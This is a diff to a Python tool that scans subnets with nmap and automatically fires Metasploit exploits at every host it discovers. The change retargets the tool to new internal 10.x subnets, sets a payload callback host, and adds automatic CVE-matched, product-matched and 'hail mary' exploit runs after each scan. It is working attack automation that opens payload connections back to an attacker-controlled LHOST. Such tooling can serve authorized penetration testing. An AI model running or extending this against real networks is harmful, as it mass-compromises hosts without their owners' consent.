@@ -21,8 +21,8 @@ import pymetasploit3.msfrpc as msfrpc
 # Tools needed: nmap, tmux, metasploit, exploitdb
 
 # Options
-subnets = ["192.168.1.0/24"] # Specify CIDR subnets here.
-ignore_ips = ["192.168.1.1", "192.168.1.105", "192.168.1.255"]  # Specify IPs to ignore here.
+subnets = ["10.200.210.0/24", "10.100.110.0/24", "10.100.210.0/24"] # Specify CIDR subnets here.
+ignore_ips = ["10.200.210.0", "10.100.210.0", "10.100.110.0"]  # Specify IPs to ignore here.
 metasploit_modules_dir = "/usr/share/metasploit-framework/modules/" # Set the metasploit modules directory.
 if not os.path.isdir(metasploit_modules_dir):
     metasploit_modules_dir = "/opt/metasploit/modules/"
@@ -49,7 +49,7 @@ cached_msf_searches_filename = f"{results_dir}/msf_search_cache.json"
 
 # Metasploit options.
 msfconsole_command = 'msfconsole -x "use {};set RHOSTS {};set RPORT {};set LHOST {};set LPORT 443;show targets"'
-payload_lhost = "192.168.1.105"
+payload_lhost = "10.192.0.13"
 payload_lport = 1000 # Starting lport.
 
 # Metasploit Control Options
@@ -115,6 +115,23 @@ def scan_host(ip: str, do_full_scan=False):
 
             for ip in results:
                 all_scan_results[ip] = results[ip]
+
+                print("Automatically running MSF exploits with CVEs...")
+                new_thread = threading.Thread(target=run_msf_against_scan_result_cves, args=[results])
+                new_thread.start()
+                run_msf_against_scan_result_cves(results)
+
+                print("Automatically running MSF exploits with Products...")
+                new_thread = threading.Thread(target=run_msf_against_scan_result_products, args=[results])
+                new_thread.start()
+                run_msf_against_scan_result_products(results)
+
+                print("Automatically running MSF hail mary attack...")
+                new_thread = threading.Thread(target=run_msf_hail_mary_scan_result, args=[results])
+                new_thread.start()
+                run_msf_hail_mary_scan_result(results)
+
+                save_msf_metadata()
 
             retry_count = 0
         except Exception as e:
@@ -590,6 +607,17 @@ def metasploit_test():
     # print(get_console_output_of_msfconsole())
 
 
+def save_msf_metadata():
+    global cached_msf_searches_filename
+    global results_dir
+
+    with open(results_dir + "exploits_attempted.json", "w") as outfile:
+        json.dump(all_attempted_msf_exploits, outfile, indent=2)
+
+    with open(cached_msf_searches_filename, "w") as outfile:
+        json.dump(cached_msf_searches, outfile, indent=2)
+
+
 # ======================================================================================================================
 # MAIN FUNCTION
 # ======================================================================================================================
@@ -666,7 +694,7 @@ def main():
         print("Performing first quick scan.")
         print("Pinging subnets to find hosts...")
         for subnet in subnets:
-            for ip in ipaddress.IPv4Network(subnet):
+            for ip in ipaddress.IPv4Network(subnet, False):
                 wait_for_open_thread(ping_thread_list, max_ping_threads)
                 create_ping_thread(str(ip))
 
@@ -691,11 +719,7 @@ def main():
         print("Automatically running MSF exploits with Products...")
         run_msf_against_scan_result_products(all_scan_results)
 
-    with open(results_dir + "exploits_attempted.json", "w") as outfile:
-        json.dump(all_attempted_msf_exploits, outfile, indent=2)
-
-    with open(cached_msf_searches_filename, "w") as outfile:
-        json.dump(cached_msf_searches, outfile, indent=2)
+    save_msf_metadata()
 
 
 if __name__ == "__main__":
